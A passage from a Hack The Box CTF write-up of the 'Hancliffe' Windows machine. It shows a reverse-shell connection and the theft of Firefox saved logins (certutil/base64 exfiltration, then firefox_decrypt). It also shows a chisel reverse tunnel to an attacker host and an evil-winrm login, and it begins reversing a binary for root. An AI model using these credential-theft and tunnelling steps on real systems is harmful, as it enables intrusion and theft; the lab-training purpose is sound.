<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4499 ...</span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.3</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.115]</span> 62188</span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Windows</span> PowerShell running as user clara on HANCLIFFE</span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Copyright</span> <span class="er">(</span><span class="ex">C</span><span class="kw">)</span> <span class="ex">2015</span> Microsoft Corporation. All rights reserved.</span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a><span class="ex">PS</span> C:<span class="dt">\U</span>sers<span class="dt">\c</span>lara<span class="op">&gt;</span> type Desktop/user.txt</span>
<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a><span class="ex">fbcd97c3cb51969565dfe241c1149a62</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
<p><br></p>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>After a lot of enumeration I came across the Mozilla Firefox profiles containing sensitive files <code>logins.json</code>, <code>key4.db</code>, <code>cookies.sqlite</code> and <code>cert9.db</code>.</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release<span class="op">&gt;</span> <span class="fu">cat</span> logins<span class="op">.</span><span class="fu">json</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span><span class="st">"nextId"</span><span class="op">:</span><span class="dv">2</span><span class="op">,</span><span class="st">"logins"</span><span class="op">:[{</span><span class="st">"id"</span><span class="op">:</span><span class="dv">1</span><span class="op">,</span><span class="st">"hostname"</span><span class="op">:</span><span class="st">"http://localhost:8000"</span><span class="op">,</span><span class="st">"httpRealm"</span><span class="op">:</span>null<span class="op">,</span><span class="st">"formSubmitURL"</span><span class="op">:</span><span class="st">"http://localhost:8000"</span><span class="op">,</span><span class="st">"usernameField"</span><span class="op">:</span><span class="st">"website"</span><span class="op">,</span><span class="st">"passwordField"</span><span class="op">:</span><span class="st">"masterpassword"</span><span class="op">,</span><span class="st">"encryptedUsername"</span><span class="op">:</span><span class="st">"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECP+7GREfh/OCBBACN8BqXSHhgvedk/ffsRBn"</span><span class="op">,</span><span class="st">"encryptedPassword"</span><span class="op">:</span><span class="st">"MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEQe5quezh5lBCg7VV7cXOky4tBMinRRncbXJl1YC3P0Ql5J8ZZS6ZnVjg9yXrbOq1Me"</span><span class="op">,</span><span class="st">"guid"</span><span class="op">:</span><span class="st">"{39d1884b-56cd-4e30-869b-e0d9df6ca9d9}"</span><span class="op">,</span><span class="st">"encType"</span><span class="op">:</span><span class="dv">1</span><span class="op">,</span><span class="st">"timeCreated"</span><span class="op">:</span><span class="dv">1624771259387</span><span class="op">,</span><span class="st">"timeLastUsed"</span><span class="op">:</span><span class="dv">1624771259387</span><span class="op">,</span><span class="st">"timePasswordChanged"</span><span class="op">:</span><span class="dv">1624771259387</span><span class="op">,</span><span class="st">"timesUsed"</span><span class="op">:</span><span class="dv">1</span><span class="op">}],</span><span class="st">"potentiallyVulnerablePasswords"</span><span class="op">:[],</span><span class="st">"dismissedBreachAlertsByLoginGUID"</span><span class="op">:{},</span><span class="st">"version"</span><span class="op">:</span><span class="dv">3</span><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Copy the files from Windows to Kali using <code>certutil -encode</code>.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release<span class="op">&gt;</span> certutil<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>encode logins<span class="op">.</span><span class="fu">json</span> C<span class="op">:</span>\Windows\Tasks\logins<span class="op">.</span><span class="fu">b64</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>Input Length <span class="op">=</span> <span class="dv">674</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="dt">Output</span> Length <span class="op">=</span> <span class="dv">986</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="dt">CertUtil</span><span class="op">:</span> <span class="op">-</span>encode command completed successfully<span class="op">.</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release<span class="op">&gt;</span> <span class="fu">type</span> C<span class="op">:</span>\Windows\Tasks\logins<span class="op">.</span><span class="fu">b64</span></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="op">-----</span>BEGIN CERTIFICATE-----</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>eyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov</span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>L2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM</span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>IjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp</span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>dGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV</span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>c2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2</span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>Y05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j</span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>cnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ</span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a>SUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi</span>
<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>WEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx</span>
<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>ODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi</span>
<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>dGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3</span>
<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a>MTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt</span>
<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a>ZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s</span>
<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a>ImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6</span>
<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a>M30<span class="op">=</span></span>
<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="op">-----</span>END CERTIFICATE-----</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>And decoding/pasting the file in Kali using <code>base64 -d</code>.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> echo <span class="st">"eyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="st">L2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="st">IjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="st">dGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV</span></span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="st">c2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2</span></span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="st">Y05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j</span></span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="st">cnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ</span></span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a><span class="st">SUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi</span></span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a><span class="st">WEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx</span></span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a><span class="st">ODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi</span></span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="st">dGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3</span></span>
<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a><span class="st">MTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt</span></span>
<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a><span class="st">ZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s</span></span>
<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a><span class="st">ImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6</span></span>
<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a><span class="st">M30="</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span> <span class="op">&gt;</span> logins.json</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Do the same for the remaining files <code>key4.db</code>, <code>cookies.sqlite</code> and <code>cert9.db</code>. Save all files in a profile directory, and in the parent directory create <code>profiles.ini</code> file.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe/firefox-loot]</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> tree                 </span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">├──</span> ljftf853.default-release</span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span> ├── cert9.db</span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span> ├── cookies.sqlite</span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span> ├── key4.db</span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span> └── logins.json</span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="ex">└──</span> profiles.ini</span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe/firefox-loot]</span></span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat profiles.ini            </span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[Profile1]</span></span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="va">Name</span><span class="op">=</span>default</span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a><span class="va">IsRelative</span><span class="op">=</span>1</span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a><span class="va">Path</span><span class="op">=</span>ljftf853.default-release</span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a><span class="va">Default</span><span class="op">=</span>1</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Download and run <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a> to extract the credentials.</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/opt/firefox_decrypt]</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ./firefox_decrypt.py /htb/hancliffe/firefox-loot            </span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Website:</span>   http://localhost:8000</span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> <span class="st">'hancliffe.htb'</span></span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> <span class="st">'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>To understand what the <code>firefox_decrypt</code> output actually means we can have a closer look into the file <code>logins.json</code>. * <code>"hostname":"http://localhost:8000"</code> - <code>"usernameField":"website"</code> - <code>"passwordField":"masterpassword"</code></p>
<p>From this we are missing one input parameter from the Stageless Password Manager on port 8000, Full Name. Looking on the password (<code>#@H@ncLiff3D3velopm3ntM@st3rK3y*!</code>) and in <code>C:\Users\</code> we can guess that it belongs to user <code>development</code>. Using all found parameters we get the generated password <code>AMl.q2DHp?2.C/V0kNFU</code>.</p>
<p><img src="images/hancliffe02.png" class="img-fluid"></p>
<p>Trying to change user with the standard PS ScriptBlock gives no output:</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="va">$user</span> <span class="op">=</span> <span class="st">'development'</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="va">$pass</span> <span class="op">=</span> <span class="st">'AMl.q2DHp?2.C/V0kNFU'</span> <span class="op">|</span> <span class="fu">ConvertTo-SecureString</span> <span class="op">-</span>AsPlainText <span class="op">-</span>Force</span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="va">$creds</span> <span class="op">=</span> <span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PSCredential</span><span class="op">(</span><span class="va">$user</span><span class="op">,</span><span class="va">$pass</span><span class="op">)</span></span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-Command</span> <span class="op">-</span>ComputerName localhost <span class="op">-</span>Credential <span class="va">$creds</span> <span class="op">-</span>ScriptBlock <span class="op">{</span> whoami <span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Nor does the credentials work for the service on port 9999:</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc hancliffe.htb 9999                                               127 ⨯</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> development</span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> AMl.q2DHp<span class="pp">?</span>2.C/V0kNFU</span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Username</span> or Password incorrect</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>This threw me off guard for a while, before I went back to look on my enumerated data and saw that port <strong>5985</strong> is open locally.</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/opt/chisel]</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ./chisel server <span class="at">-p</span> 9000 <span class="at">--reverse</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/01/07</span> 10:40:26 server: Reverse tunnelling enabled</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/01/07</span> 10:40:26 server: Fingerprint N5yEuHLOYJ6FFzk6vpDu7Pi1M2815GcnvXEo7BGBhT0=</span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/01/07</span> 10:40:26 server: Listening on http://0.0.0.0:9000</span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/01/07</span> 10:40:29 server: session#1: tun: proxy#R:5985=<span class="op">&gt;</span>localhost:5985: Listening</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb27"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\chisel<span class="op">.</span><span class="fu">exe</span> client <span class="dv">10.10</span><span class="op">.</span><span class="dv">14.8</span><span class="op">:</span><span class="dv">9000</span> R<span class="op">:</span><span class="dv">5985</span><span class="op">:</span>localhost<span class="op">:</span><span class="dv">5985</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> evil-winrm <span class="at">-i</span> localhost <span class="at">-u</span> development <span class="at">-p</span> <span class="st">"AMl.q2DHp?2.C/V0kNFU"</span>                                                                                      1 ⨯</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">*Evil-WinRM*</span> PS C:<span class="dt">\U</span>sers<span class="dt">\d</span>evelopment<span class="dt">\D</span>ocuments<span class="op">&gt;</span> whoami</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="ex">hancliffe\development</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Next step is pretty obvious, we need to break the application on port 9999 some how to gain a root shell. And looking in <code>C:\DevApp</code> we find the source:</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\DevApp<span class="op">&gt;</span> <span class="fu">ls</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>Mode                 LastWriteTime         Length Name</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="op">----</span>                 <span class="op">-------------</span>         <span class="op">------</span> <span class="op">----</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----         <span class="dv">9</span><span class="op">/</span><span class="dv">14</span><span class="op">/</span><span class="dv">2021</span>   <span class="dv">5</span><span class="op">:</span><span class="dv">02</span> AM          <span class="dv">60026</span> MyFirstApp<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----         <span class="dv">9</span><span class="op">/</span><span class="dv">14</span><span class="op">/</span><span class="dv">2021</span>  <span class="dv">10</span><span class="op">:</span><span class="dv">57</span> AM            <span class="dv">636</span> restart<span class="op">.</span><span class="fu">ps1</span></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\DevApp<span class="op">&gt;</span> <span class="fu">cat</span> restart<span class="op">.</span><span class="fu">ps1</span></span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Restart app every 3 mins to avoid crashes</span></span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span><span class="op">(</span><span class="va">$true</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a>  <span class="co"># Delete existing forwards</span></span>
<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a>  cmd <span class="op">/</span>c <span class="st">"netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"</span></span>
<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a>  <span class="co"># Spawn app</span></span>
<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a>  <span class="va">$proc</span> <span class="op">=</span> <span class="fu">Invoke-WmiMethod</span> <span class="op">-</span>Class Win32_Process <span class="op">-</span>Name Create <span class="op">-</span>ArgumentList <span class="op">(</span><span class="st">"C:\DevApp\MyFirstApp.exe"</span><span class="op">)</span></span>
<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sleep</span> <span class="dv">2</span></span>
<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a>  <span class="co"># Get random port</span></span>
<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a>  <span class="va">$port</span> <span class="op">=</span> <span class="op">(</span>Get-NetTCPConnection <span class="op">-</span>OwningProcess <span class="va">$proc</span><span class="op">.</span><span class="fu">ProcessId</span><span class="op">).</span><span class="fu">LocalPort</span></span>
<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a>  <span class="co"># Forward port to 9999</span></span>
<span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a>  cmd <span class="op">/</span>c <span class="st">"netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=</span><span class="va">$port</span><span class="st"> connectaddress=127.0.0.1"</span></span>
<span id="cb29-20"><a href="#cb29-20" aria-hidden="true" tabindex="-1"></a>  <span class="fu">sleep</span> <span class="dv">180</span></span>
<span id="cb29-21"><a href="#cb29-21" aria-hidden="true" tabindex="-1"></a>  <span class="co"># Kill and repeat</span></span>
<span id="cb29-22"><a href="#cb29-22" aria-hidden="true" tabindex="-1"></a>  taskkill <span class="op">/</span>f <span class="op">/</span>t <span class="op">/</span>im MyFirstApp<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb29-23"><a href="#cb29-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Download <code>MyFirstApp.exe</code> and start analyze it! In Ghidra we find a few interesting things..</p>
<p>.. a login function containing username and a base64 encoded password in clear text <img src="images/hancliffe03.png" class="img-fluid"></p>
<p>.. encryption function <code>encrypt1</code><br> <img src="images/hancliffe04.png" class="img-fluid"></p>
<p>.. encryption function <code>encrypt2</code><br> <img src="images/hancliffe05.png" class="img-fluid"></p>
<p>Working our way backwards with the <strong>login function</strong> we can see that..</p>
<p>.. line 23, <code>enc2_len</code> is the lenght (17) of the base64 DECODED <code>b64pass</code> variable</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
